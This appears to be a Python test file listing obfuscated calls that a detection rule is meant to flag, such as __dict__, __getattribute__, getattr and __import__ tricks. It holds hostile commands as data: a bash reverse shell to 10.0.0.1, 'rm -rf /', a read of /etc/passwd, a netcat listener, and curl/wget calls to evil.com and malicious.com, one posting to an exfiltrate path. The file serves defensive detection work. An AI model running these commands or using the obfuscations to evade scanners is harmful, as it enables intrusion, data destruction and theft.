# test_positive_cases.py - These should be DETECTED by the rule

# Test 1: __dict__ access patterns
import os
os.__dict__['system']('ls')

# Test 2: __dict__ with __call__
import os
os.__dict__['system'].__call__('whoami')

# Test 3: __getattribute__ patterns
import subprocess
subprocess.__getattribute__('call')(['ls', '-la'])

# Test 4: __getattribute__ with __call__
import subprocess
subprocess.__getattribute__('call').__call__(['ps'])

# Test 5: __import__ with direct method call
__import__('os').system('id')

# Test 6: __import__ with __call__
__import__('os').system.__call__('uname -a')

# Test 7: __import__ with __dict__ access
__import__('os').__dict__['system']('cat /etc/passwd')

# Test 8: __import__ with __dict__ and __call__
__import__('os').__dict__['system'].__call__('netstat -an')

# Test 9: __import__ with __getattribute__
__import__('subprocess').__getattribute__('run')(['wget', 'malicious.com/payload'])

# Test 10: __import__ with __getattribute__ and __call__
__import__('subprocess').__getattribute__('run').__call__(['curl', 'evil.com'])

# Test 11: getattr with module object
import os
getattr(os, 'system')('rm -rf /')

# Test 12: getattr with module and __call__
import os
getattr(os, 'system').__call__('nc -l 4444')

# Test 13: getattr with __import__
getattr(__import__('os'), 'system')('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')

# Test 14: getattr with __import__ and __call__
getattr(__import__('os'), 'system').__call__('python -c "import socket..."')

# Test 15: Custom modules (should also be detected)
import json
json.__dict__['loads']('{"malicious": "payload"}')

# Test 16: Any module/method combination
import urllib.request
urllib.request.__getattribute__('urlopen')('http://malicious.com')

# Test 17: Complex nested example
result = getattr(__import__('subprocess'), 'check_output').__call__(['curl', '-X', 'POST', 'evil.com/exfiltrate'])

# Test 18: Network obfuscation
import socket
socket.__dict__['socket'].__call__()

# Test 19: Eval obfuscation
import builtins
builtins.__getattribute__('eval')('malicious_code')

# Test 20: Environment variable access (no arguments)
os.__dict__['getenv']()

# Test 21: String concatenation in method name
os.__dict__['host' + 'name']()

# Test 22: Using variables for method names
method_name = 'getcwd'
os.__dict__[method_name]()

# Test 23: Base64 decoded method name
import base64
os.__dict__[base64.b64decode("Z2V0Y3dk").decode()]()

# Test 24: Hex encoded method name
os.__dict__["\x67\x65\x74\x63\x77\x64"]()
os.__dict__[bytes.fromhex('676574637764').decode('utf-8')]()